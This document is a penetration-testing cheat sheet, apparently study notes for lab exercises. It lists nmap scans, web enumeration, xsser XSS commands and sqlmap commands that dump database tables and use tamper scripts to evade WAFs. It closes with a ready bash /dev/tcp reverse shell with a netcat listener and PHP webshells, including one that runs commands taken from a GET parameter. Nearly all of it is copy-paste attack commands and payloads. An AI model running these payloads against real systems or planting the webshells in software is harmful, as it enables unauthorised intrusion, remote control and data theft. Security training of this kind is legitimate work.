# Port scanning and service fingerprinting

## Nmap

### Ping sweep

```shell
nmap -sn -n $IP_range_CIDR -oN network_hosts
```

### Port scanning

#### Most complete command so far
```shell
nmap -sS -n -Pn -p- -T3 -sV -sC -O $target_IP -oN targetx -oG targetx
```

#### SYN scan (noisy)
```shell
nmap -sS -n -Pn -p- --min-rate 5000 $target_IP -oN allPorts -oG allPorts
```

#### Connect() scan
```shell
nmap -sT -n -Pn -p- --min-rate 5000 $target_IP -oN allPorts -oG allPorts
```

#### UDP scan
```shell
nmap -sU -n -Pn -p- --min-rate 5000 $target_IP -oN allPorts -oG allPorts
```

## When a domain resolves to multiple IP addresses

To scan all the resolved IP addresses use the following option
```bash
nmap ...( command)... --resolve-all
```
Note the use of the **resolve-all** option.

### Service fingerprinting and NSE scripts

Enter the comma separated list of the open ports after the `-p` parameter

```shell
nmap -sC -sV -p $OPEN_PORTS -oN targeted
```
```shell
nmap -sV --script vuln -p $OPEN_PORTS -oN scripts
```


## Other tools

# Web server attacks

## Web server fingerprinting

Check for dangerous HTTP methods, server version, ...

### Ncat

```bash
nc <target> 80
```
Then perform requests

```
OPTIONS / HTTP/1.0  <- append TWO spaces at the end!
```
To prevent the listener from closing use:

```bash
nc -lvp 80 -k
```

To add a timeout for connections:

```bash
nc -lvp 80 -k -w 1
```


### OpenSSL

Use this for HTTPS context

```bash
openssl s_client -connect target.site:443
```
Then perform requests

```
OPTIONS / HTTP/1.0  <- append TWO spaces at the end!
```

### Curl OPTIONS request

```bash
curl -X OPTIONS https://example.org -i
```

### whatweb

To get the server banners run

```shell
whatweb $TARGET_URL
```

### Nikto (slow but useful)

```bash
nikto -h target.site
```

## Directory and file enumeration

### dirb

dirb $TARGET $WORDLIST -X zip,tar,gz,tgz,rar,java,cs,pdf,docx,rtf,xlsx,pptx,asa,inc,config,txt,xxx,old,bak,sql,php,html,js,json,png,jpg,01,bac,_bak,001,000,inc,~

### dirsearch

```bash
dirsearch -u $TARGET -w $WORDLISTS -e zip,tar,gz,tgz,rar,java,cs,pdf,docx,rtf,xlsx,pptx,asa,inc,config,txt,xxx,old,bak,sql,php,html,js,json,png,jpg,01,bac,_bak,001,000,inc,~ -f


python3 ./dirsearch.py -u 'https://miurl.com'  -R 3 -r  -w ~/tools/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt

```

### gobuster
```bash
gobuster dir -u $URL -w $WORDLIST -q -o $OUTPUT_FILE -x zip,tar,gz,tgz,rar,java,cs,pdf,docx,rtf,xlsx,pptx,asa,inc,config,txt,xxx,old,bak,sql,php,html,js,json,png,jpg,01,bac,_bak,001,000,inc,~ 
```
# XSS

Test all user inputs to render HTML placing tags or execute JavaScript code with the `<script>` tag.

## XSSER

USAGE


Replace the parameter to inject with the “XSS” keyword or put the XSS keyword on the URL GET parameter to inject payload.

  

### GET REQUEST

```shell
xsser --url 'http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=sas&user-poll-php-submit-button=Submit+Vote'
```


  
### POST REQUEST

Get the request parameters and use the -p flag to set the reflection points

```shell
xsser --url 'http://VULNERABLE/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```


### AUTOMATIC PAYLOAD

Append the `–auto` flag

```shell
xsser --url 'http://VULNERABLE/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' –auto
```
  

### CUSTOM PAYLOAD

Append the –Fp switch with the custom payload

```shell
xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
```


```shell
xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"
```
  
# SQLInjection

## SQLMap

General thorough scan

```bash
sqlmap -r helpdesk.req --threads 10 --level 3 --risk 2 --answers="follow=Y" --batch 
```

To avoid the tool from prompting use these flags: `--answers="follow=Y" --batch`

### GET parameters

Enumerate DBMS banner, the current Database and it's tables using 10 threads

```shell
sqlmap -u 'http://demo.ine.local/index.php?page=user-info.php&username=sf&password=saf&user-info-php-submit-button=View+Account+Details' -p username --banner --current-db --tables --threads 10

```

Dump the information of a table

```shell
sqlmap -u 'http://demo.ine.local/index.php?page=user-info.php&username=sf&password=saf&user-info-php-submit-button=View+Account+Details' -p username --banner --current-db --dump -T accounts --threads 10
```


### POST request

Define the POST parameters with the `--data` flag.

```shell
sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --dump --tables --threads 10

```

## Attempts to bypass a WAF or filter

Get a detailed list of the available tamper scripts and their functionality.

```bash
sqlmap --list-tamper
```

```bash
sqlmap -u 'http://demo.ine.local/index.php?page=login.php' -p page --threads 10 --cookie="cookie=value" --level=2 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

Additional parameters can be

```bash
--code=HTTPCode --no-cast --no-escape
```

## Setting cookie values

```bash
sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --threads 10 --cookie="cookie=value"
```

The cookie parameter can be filled with the HTTP Cookie header value from valid requests.

## Using a saved request

```shell
sqlmap -r req.txt -p parameter
```

## Dump a specific table

```shell
sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --dump -T table --threads 10
```

## Dump a specific table from a given database
```shell
sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner -D database --dump -T table --threads 10
```

# Simple Linux reverse shell

## Payload
```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1" 
```
## Listener
```bash
nc -lvp $PORT
```
For comfort
```bash
rlwrap nc -lvp $PORT
```
# Webshells

## PHP

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
More flexible webshell
```php
<?php echo system($_GET['command']); ?>
```
Trigger

```HTTP
GET /example/exploit.php?command=id HTTP/1.1
```


# Common ports 

21,22,25,53,443,5000,8000,8080,3306
